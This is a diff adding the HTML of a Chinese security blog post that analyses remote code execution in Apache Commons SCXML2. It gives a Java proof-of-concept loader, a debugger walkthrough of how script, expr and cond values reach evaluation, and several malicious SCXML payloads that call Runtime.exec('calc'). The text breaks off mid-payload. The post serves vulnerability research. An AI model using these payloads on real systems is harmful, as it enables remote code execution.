@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Apache SCXML2 RCE分析 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Apache SCXML2 RCE分析 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-23T16:12:54.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>24,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">Apache SCXML2 RCE分析</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一开始是看到ctfio上的这篇文章，感到比较好奇，因为挺新的<br><a target="_blank" rel="noopener" href="https://www.ctfiot.com/96133.html">https://www.ctfiot.com/96133.html</a><br>经过我一晚上的玄学探究，和调试，最终发现这东西还挺好玩的妈的，并且发现POC不是一般的多，网上传出来的只有2种，我挖出来至少十种格式xml以上，但是没有完全统计出来，搞懂原理就知道一切了</p>
+<h1 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h1><p>Apache SCXML2 可以通过加载恶意xml文件实现RCE，这个XML的标签需要经过恶意的构造才行，接下来简单复现一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们加载这个XML文件后，就可以RCE<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703111347-7e32b7bd-d42e-45dd-9a9e-14c06f2a4748.png#averageHue=%232b2b26&clientId=ue92324cf-bcd1-4&from=paste&height=686&id=u2d2a56e6&name=image.png&originHeight=857&originWidth=1764&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1880577&status=done&style=none&taskId=u0195a945-4c0b-4bfc-b2f7-366043d4619&title=&width=1411.2" alt="image.png"></p>
+<h1 id="细腻分析"><a href="#细腻分析" class="headerlink" title="细腻分析"></a>细腻分析</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703274609-a33f3c20-c1fc-4e9b-a189-75e80b74df3b.png#averageHue=%2332322c&clientId=ue92324cf-bcd1-4&from=paste&height=294&id=uff20c58f&name=image.png&originHeight=367&originWidth=1181&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=603206&status=done&style=none&taskId=uf41bd3e2-04c8-4f40-a565-c0da16f4ba8&title=&width=944.8" alt="image.png"><br>断点先先给在read方法出，我们看看流程<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703319221-d709ff83-1331-4132-805d-1157256c90cb.png#averageHue=%23383b37&clientId=ue92324cf-bcd1-4&from=paste&height=144&id=u8bfb0aee&name=image.png&originHeight=180&originWidth=992&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=275722&status=done&style=none&taskId=ueacd995e-0174-4a6f-b10a-caf6cfa3d3d&title=&width=793.6" alt="image.png"><br>进入read方法，又调用了另一个参数不同的read，在这里传入我们xml的path，并且初始化了一个Configuration<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703363879-6049a5d5-6bc7-4901-8089-cfd3d637a9e5.png#averageHue=%23333430&clientId=ue92324cf-bcd1-4&from=paste&height=239&id=ubfd5bdf8&name=image.png&originHeight=299&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=495268&status=done&style=none&taskId=ua1faaf56-8c0f-4550-a563-af177c843e6&title=&width=909.6" alt="image.png"><br>将XML的路径和配置类都传入readInternal方法里，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703440111-6747ea6c-ccd9-4dda-946b-934b58bfbdb3.png#averageHue=%23292b29&clientId=ue92324cf-bcd1-4&from=paste&height=987&id=u75668ecd&name=image.png&originHeight=1234&originWidth=1949&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3599225&status=done&style=none&taskId=uc20c4516-f710-4457-a285-3110c4d71f1&title=&width=1559.2" alt="image.png"><br>然后初始化了一个URLresovler去读取XML，这边咱们的http服务就会接收到对应的请求，最后进入readDocument方法进行下一步读取<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703516562-6edc4226-e45e-4f4a-ae1b-c081bee62819.png#averageHue=%232d2d28&clientId=ue92324cf-bcd1-4&from=paste&height=529&id=u054f7c39&name=image.png&originHeight=661&originWidth=1151&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1081422&status=done&style=none&taskId=u070c982f-c696-430d-8372-85b4efb2acb&title=&width=920.8" alt="image.png"><br>获取xml的namespace和localname，最后进入readSCXML方法中进行更深次的读取<br>，这里就是重点了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703577729-0b93729f-231f-469b-b976-ce4f1bf6f705.png#averageHue=%232c2e2a&clientId=ue92324cf-bcd1-4&from=paste&height=742&id=u592437a4&name=image.png&originHeight=927&originWidth=1194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1552547&status=done&style=none&taskId=ub41999a7-6f9a-4fb5-8397-9894e2bda68&title=&width=955.2" alt="image.png"><br>这里会获取几个标签，可以看到包括我们payload里的state标签，由于最外层是state，因此进入readstate方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703679942-5a325f9d-b4fa-4bbb-ad31-def8e07787a3.png#averageHue=%2331312b&clientId=ue92324cf-bcd1-4&from=paste&height=304&id=uecd624ce&name=image.png&originHeight=380&originWidth=1017&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594487&status=done&style=none&taskId=ueeba1db0-469e-4346-a567-f9822a95e3b&title=&width=813.6" alt="image.png"><br>第二层标签是onentry，所以进入了readOnEntry方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703707960-0140cb0a-b585-441b-b4a6-4501f2649c0e.png#averageHue=%2332332e&clientId=ue92324cf-bcd1-4&from=paste&height=233&id=ue3f5e7fb&name=image.png&originHeight=291&originWidth=1162&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=509038&status=done&style=none&taskId=u47323aeb-03c3-427f-b0a4-c06172b2636&title=&width=929.6" alt="image.png"><br>进入readExecutableContext方法，接下来也是重点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703738859-0d174c23-825b-4b0b-9321-4f7e264864c7.png#averageHue=%232d2d29&clientId=ue92324cf-bcd1-4&from=paste&height=214&id=uc4103bd5&name=image.png&originHeight=267&originWidth=1135&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=463968&status=done&style=none&taskId=ue803700f-73ac-4427-a8a3-713b4f8fe40&title=&width=908" alt="image.png"><br>第三层是script，所以读取script标签<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703853926-705adeda-9fc1-42c3-8128-b3f1e649cb3d.png#averageHue=%23282a28&clientId=ue92324cf-bcd1-4&from=paste&height=900&id=u6f5f5b9b&name=image.png&originHeight=1125&originWidth=2069&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3459175&status=done&style=none&taskId=ufedcba6e-ec7f-41cf-9652-74e2fbb6db6&title=&width=1655.2" alt="image.png"><br>在这里设置了body体，也就是恶意的payload，最后进入addAction方法，随之就完成了这一系列的读取和添加，退回readOnEntry<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703913020-236aa130-b054-44d2-a560-901dc365254d.png#averageHue=%2330302c&clientId=ue92324cf-bcd1-4&from=paste&height=187&id=u23ba2f3a&name=image.png&originHeight=234&originWidth=1148&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=389596&status=done&style=none&taskId=u8c74eb33-b77c-48be-88b2-900eb9a00f3&title=&width=918.4" alt="image.png"><br>最后添加进去后，进入POC中的第二个方法，setStateMachine<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680703971985-2ace8782-27d8-4ade-a479-4cab936026ce.png#averageHue=%2331312c&clientId=ue92324cf-bcd1-4&from=paste&height=300&id=uaf8cdeec&name=image.png&originHeight=375&originWidth=1152&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605599&status=done&style=none&taskId=uabd184dc-061e-4269-9037-591c2e0cd4d&title=&width=921.6" alt="image.png"><br>省去一些跟进，直接到getGlobalContext(),在这里获取一下globalcontext<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704162505-ee7a641a-ac9d-465d-991e-06d7494b797e.png#averageHue=%23292a27&clientId=ue92324cf-bcd1-4&from=paste&height=602&id=ue2134707&name=image.png&originHeight=752&originWidth=1802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2017273&status=done&style=none&taskId=u5316301e-e7b7-480b-9c19-dde1ea4daa6&title=&width=1441.6" alt="image.png"><br>随之退回setStateMaching，给evaluator属性赋值为刚刚上述流程得到的evaluator<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704194872-082851fe-627f-46bf-8958-276c43c8031b.png#averageHue=%232d2e2a&clientId=ue92324cf-bcd1-4&from=paste&height=154&id=ude3245be&name=image.png&originHeight=192&originWidth=1107&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=308067&status=done&style=none&taskId=ueb95d9cc-efaf-4c5a-9225-9a4baf03ed7&title=&width=885.6" alt="image.png"><br>随之进入最后一个步骤，go方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704257948-cb603590-8775-48ab-9d14-cd403cb5bb38.png#averageHue=%2332322e&clientId=u99d5082d-523c-4&from=paste&height=222&id=u036e88a9&name=image.png&originHeight=278&originWidth=1152&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=523020&status=done&style=none&taskId=ua61f40d6-1f99-46e8-a85d-9ae82c849da&title=&width=921.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704262897-5e578661-d84e-426d-9c5f-b54bff6d1640.png#averageHue=%23343532&clientId=u99d5082d-523c-4&from=paste&height=98&id=ubf6fd20c&name=image.png&originHeight=123&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=224389&status=done&style=none&taskId=u362d1ccc-e6b4-417b-bf89-db3a3efa800&title=&width=909.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704275191-104384bf-7f8b-4781-a6ab-adff504a68a8.png#averageHue=%2331312c&clientId=u99d5082d-523c-4&from=paste&height=186&id=ud0f77426&name=image.png&originHeight=233&originWidth=1170&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=387577&status=done&style=none&taskId=ub9850c50-e0ba-4a43-8b0f-ccbe3471545&title=&width=936" alt="image.png"><br>进入firststep方法，这里的exctx储存着上述得到的所有东西<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704309157-9a6bb84e-50d0-4ff6-8c15-9d73731a9c7c.png#averageHue=%23272927&clientId=u99d5082d-523c-4&from=paste&height=324&id=u32e16c23&name=image.png&originHeight=405&originWidth=1269&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=787007&status=done&style=none&taskId=u00f84ad0-4274-48fb-b276-c1a484cd16e&title=&width=1015.2" alt="image.png"><br>进入fiststep方法先初始化，然后通过executeGloablScript方法执行globalscript，由于我们这次payload最外层是state不是script，所以没用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704492842-6ce61071-8934-475c-a4fe-4f35d20b35c5.png#averageHue=%2331322e&clientId=u99d5082d-523c-4&from=paste&height=250&id=uc8cf0c24&name=image.png&originHeight=312&originWidth=1324&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=679858&status=done&style=none&taskId=u60f4bce0-2241-4cdb-b64b-e2ec9b4eae3&title=&width=1059.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704595753-c80934c1-5d13-44c5-887d-d15e343052df.png#averageHue=%2332322d&clientId=u99d5082d-523c-4&from=paste&height=249&id=u67a2b049&name=image.png&originHeight=311&originWidth=1330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=675187&status=done&style=none&taskId=u78423df4-4cfd-4b5c-a72b-8e9fed9d5b0&title=&width=1064" alt="image.png"><br>先进入getStateMachine方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704626329-f2fcc310-df36-4ebe-8c1d-90f99c0392f2.png#averageHue=%23282a28&clientId=u99d5082d-523c-4&from=paste&height=400&id=u9af9ab1a&name=image.png&originHeight=500&originWidth=1045&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=760505&status=done&style=none&taskId=u26c355ba-03b5-43f6-8e21-85cd418945c&title=&width=836" alt="image.png"><br>这里面放着我们的payload，然后退出去，进入<code>getInitialTransition</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704731349-f6439148-ed31-45c1-a7da-1f33aec56456.png#averageHue=%23292a29&clientId=u99d5082d-523c-4&from=paste&height=842&id=u52dca79b&name=image.png&originHeight=1052&originWidth=1992&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2966675&status=done&style=none&taskId=u3ecd09d0-7a52-40a9-a655-c361114dbe8&title=&width=1593.6" alt="image.png"><br>这里面也放着payload，退出去，然后add进了一个hashmap，随后进入microStep<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704758226-eccd97d2-ad5d-455e-9083-cc2bccbc72a2.png#averageHue=%232f2f2a&clientId=u99d5082d-523c-4&from=paste&height=228&id=u328f5be6&name=image.png&originHeight=285&originWidth=1822&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=794338&status=done&style=none&taskId=u889b04ce-54f7-4672-84ce-5ab90a0a443&title=&width=1457.6" alt="image.png"><br>最后进入里面的<code>executeTransitionContent(exctx, step)</code>执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704815830-db88894b-8b38-4910-a726-cbb175f60e81.png#averageHue=%23292b29&clientId=u99d5082d-523c-4&from=paste&height=880&id=ue55ac3e9&name=image.png&originHeight=1100&originWidth=2060&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3305465&status=done&style=none&taskId=u50e4a4ad-6e58-4e52-9ecf-0b815c27f8b&title=&width=1648" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704834707-9a688896-4505-4cce-8c12-80b5c1a80a2b.png#averageHue=%232e2e29&clientId=u99d5082d-523c-4&from=paste&height=206&id=u081f4867&name=image.png&originHeight=258&originWidth=1861&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=726784&status=done&style=none&taskId=u35035c1f-5dc8-4059-aa3a-ace2ce1499b&title=&width=1488.8" alt="image.png"><br>通过不断的迭代取出step里面的值，但是由于这次咱们的标签里没有<code>Transition</code>所以取不出什么东西，不会执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704901020-b3907e4e-9d2a-4d34-9523-1a9900ee95d3.png#averageHue=%2332322f&clientId=u99d5082d-523c-4&from=paste&height=158&id=u8b222d4d&name=image.png&originHeight=197&originWidth=1348&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=427041&status=done&style=none&taskId=u8548210b-e6fa-4aac-a3f6-33e7657a0fe&title=&width=1078.4" alt="image.png"><br>进入enterStates方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680704997340-9c0646e9-c4f3-493a-b029-0ad7024c0f71.png#averageHue=%23292a28&clientId=u99d5082d-523c-4&from=paste&height=957&id=ua40e0135&name=image.png&originHeight=1196&originWidth=1989&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3587251&status=done&style=none&taskId=u87e1d2fb-1401-4be9-ae7f-4db048bf1e7&title=&width=1591.2" alt="image.png"><br>获取第二层标签onentry后又进入executecontent方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705033603-1850b99b-a009-4285-b559-f5cb1f97f1aa.png#averageHue=%23282926&clientId=u99d5082d-523c-4&from=paste&height=727&id=u7c0883e6&name=image.png&originHeight=909&originWidth=1871&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2527546&status=done&style=none&taskId=u6b03dfa9-04c2-4ec5-bf39-54aace9f98e&title=&width=1496.8" alt="image.png"><br>首先获取一个迭代器，里面再往深一层就是script标签<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705100452-88012098-e232-4fe1-9d6f-bfbde0f73bff.png#averageHue=%2331312e&clientId=u99d5082d-523c-4&from=paste&height=190&id=u5860d16d&name=image.png&originHeight=237&originWidth=1375&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=535874&status=done&style=none&taskId=u2e64201d-52e7-4bf0-9dae-0c78f81f252&title=&width=1100" alt="image.png"><br>进入<code>getActionExecutionContext()</code>方法，获取可执行的content，终于到最后一步了，随后进入excute方法最终执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705159384-ea9ed80b-5e41-4f14-b60d-5bcbc9515546.png#averageHue=%23282824&clientId=u99d5082d-523c-4&from=paste&height=163&id=u916d2b8c&name=image.png&originHeight=204&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=482877&status=done&style=none&taskId=u7a5317a0-9fa5-4766-af74-b02d834144d&title=&width=1186.4" alt="image.png"><br>在这里获取了script标签，调用evalScript执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705186222-2b90a698-ba8a-42d7-a7f9-bb3b4fcd5234.png#averageHue=%232a2b27&clientId=u99d5082d-523c-4&from=paste&height=855&id=ua3239572&name=image.png&originHeight=1069&originWidth=2055&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2976973&status=done&style=none&taskId=u9fe9b55e-f650-49d0-9394-94d5e40aa42&title=&width=1644" alt="image.png"></p>
+<h1 id="思考其他payload"><a href="#思考其他payload" class="headerlink" title="思考其他payload"></a>思考其他payload</h1><p>在这上述过程中，最后一步咱们调用的是不是evalScript，方法，我们看看还有啥其他类似的？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705595373-4ff53756-d35c-4d0b-883a-23b9a72df9ba.png#averageHue=%232e302b&clientId=u5365b83f-daf5-4&from=paste&height=101&id=ud738d491&name=image.png&originHeight=126&originWidth=494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100674&status=done&style=none&taskId=uf483c4ba-94f0-4763-8c84-6df910693fb&title=&width=395.2" alt="image.png"><br>那也就是说明<code>Cond、Location、Assign、Script</code>起码都是可以的，其实Location、Assign最终实际调用的是eval，都是获取expr属性<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705775999-b6db749e-b7fc-4bc1-a6ff-1675d4a91308.png#averageHue=%2331312b&clientId=u5365b83f-daf5-4&from=paste&height=274&id=u59b9b654&name=image.png&originHeight=342&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=773281&status=done&style=none&taskId=ub4cadc34-57e0-42d4-b8db-81304d3ad2b&title=&width=1125.6" alt="image.png"><br>会获取expr属性，然后eval就是执行expr属性的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705791291-70fb64e3-9175-4543-95e4-6f84e8dccb1b.png#averageHue=%232f2f29&clientId=u5365b83f-daf5-4&from=paste&height=315&id=u3b9846c0&name=image.png&originHeight=394&originWidth=1530&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=946662&status=done&style=none&taskId=uabca4245-f584-4296-9f43-59db249a4b9&title=&width=1224" alt="image.png"><br>然后这些payload的根源都是从哪儿起来的呢？答案是read方法，记得read方法里的这一步吗？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680705854063-7a264aa8-90d1-4ed6-a28d-e352e485b8f7.png#averageHue=%2330302d&clientId=u5365b83f-daf5-4&from=paste&height=530&id=uaaa64981&name=image.png&originHeight=662&originWidth=1020&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=961038&status=done&style=none&taskId=u775a0bd0-ea2b-4d53-8ddc-c2c9ed5e6f2&title=&width=816" alt="image.png"><br>会获取以下5个最外层标签，那我们就分析一下，这五个标签有啥可能性，就不调试了直接说简单说分析<br>最终可用来执行命令的属性或者是标签为</p>
+<ul>
+<li>script标签</li>
+<li>expr属性</li>
+<li>cond属性</li>
+<li>assign标签的expr属性（归根还是expr属性)</li>
+</ul>
+<p>这里就直接放一些其他payload了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datamodel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">datamodel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parallel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">invoke</span> <span class="attr">src</span>=<span class="string">&quot;test&quot;</span> <span class="attr">content</span>=<span class="string">&quot;test&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.class.forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span 